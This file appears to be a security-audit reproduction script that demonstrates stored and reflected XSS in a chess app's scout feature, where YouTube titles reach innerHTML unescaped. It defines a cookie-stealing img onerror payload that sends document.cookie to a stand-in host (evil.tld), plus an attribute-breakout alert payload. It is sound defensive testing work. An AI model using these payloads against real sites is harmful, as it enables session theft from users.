"""
SCOUT-01 repro: unescaped remote strings injected into innerHTML by
frontend/scout.js renderResults()  ->  stored/reflected XSS from YouTube metadata.

Path A (reflected from remote):  GET /api/scout/search  -> renderResults()
Path B (stored in scouted_content via the YouTube title): the same title becomes
        activeStudy.opening_name (scout.py `_analyze_youtube_video` falls back to
        `opening_name = title` when no ECO matches), is stamped onto every move in
        the session line tree (scout.js _onUserBoardMove), and is rendered by
        renderTreeLines() as `${line.name}` -- again raw.

NO REAL NETWORK: yt_dlp is replaced by an in-process fake.
"""
import os
import sys
import json

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from atk4_mocks import banner, install_fake_ytdlp, uninstall_fake_ytdlp  # noqa: E402

from fastapi.testclient import TestClient  # noqa: E402
from backend.api import app  # noqa: E402

PAYLOAD_TITLE = '<img src=x onerror="fetch(`http://evil.tld/x?c=`+document.cookie)">'
PAYLOAD_TITLE2 = '" onmouseover="alert(1)" x="'

FAKE_ENTRIES = {
    "entries": [
        {"id": "dP4qtaUAhWM", "title": PAYLOAD_TITLE, "uploader": "Chess", "duration": 600, "view_count": 1},
        {"id": "rmbU97iftC8", "title": "Benoni For Busy People " + PAYLOAD_TITLE2, "uploader": "Gambit", "duration": 30},
    ]
}
FAKE_VIDEO = {
    "id": "dP4qtaUAhWM",
    # A video title that matches NO opening -> opening_name = title (scout.py:226)
    "title": PAYLOAD_TITLE,
    "uploader": "Totally Legit Chess Channel",
    "duration": 4242,
    "description": "",
    "chapters": [],
}


def main():
    banner("SCOUT-01  XSS via YouTube-supplied title (no real crawl, yt_dlp faked)")
    real = install_fake_ytdlp(video_payload=lambda u: dict(FAKE_VIDEO),
                              search_payload=lambda u: FAKE_ENTRIES)
    client = TestClient(app, raise_server_exceptions=False)
    try:
        r = client.get("/api/scout/search?query=Sicilian%20Defense&limit=5")
        print("GET /api/scout/search ->", r.status_code)
        data = r.json()
        yt = [d for d in data if d["source_type"] == "youtube"]
        for row in yt:
            print("  server returned title:", repr(row["title"]))
        assert any(PAYLOAD_TITLE in row["title"] for row in yt), "payload did not survive to the API"

        # Dump the API payload for the node-side renderer proof
        here = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(here, "atk4_01_search_payload.json"), "w") as f:
            json.dump(yt, f)

        r2 = client.post("/api/scout/analyze", json={"source": "https://www.youtube.com/watch?v=dP4qtaUAhWM"})
        print("\nPOST /api/scout/analyze ->", r2.status_code)
        study = r2.json()
        print("  study['title']        =", repr(study["title"]))
        print("  study['opening_name'] =", repr(study["opening_name"]))
        assert study["opening_name"] == PAYLOAD_TITLE, study["opening_name"]
        with open(os.path.join(here, "atk4_01_study_payload.json"), "w") as f:
            json.dump(study, f)

        # and it is persisted in the DB (scouted_content.title / opening_name)
        from backend.db import get_db
        conn = get_db()
        row = conn.execute("SELECT source_id, title, opening_name, channel FROM scouted_content "
                           "WHERE source_id='dP4qtaUAhWM'").fetchone()
        conn.close()
        print("  scouted_content row   =", dict(row) if row else None)
        assert row and PAYLOAD_TITLE in row["title"]
    finally:
        uninstall_fake_ytdlp(real)

    print("\nPayloads written; now render them with the REAL renderResults() under node:")
    print("  node audit/scripts/atk4_01_xss_render.js")


if __name__ == "__main__":
    main()
